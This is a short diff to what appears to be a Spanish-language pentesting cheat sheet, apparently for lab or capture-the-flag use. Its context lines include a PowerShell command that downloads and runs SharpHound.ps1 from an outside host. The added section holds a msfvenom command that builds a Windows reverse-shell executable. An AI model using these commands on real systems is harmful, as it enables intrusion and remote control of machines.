@@ -140,3 +140,8 @@ gpp-decrypt "<hash>"
 IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
 ```
 
+### Generación de Reverse Shell ejecutable
+
+```python
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+```
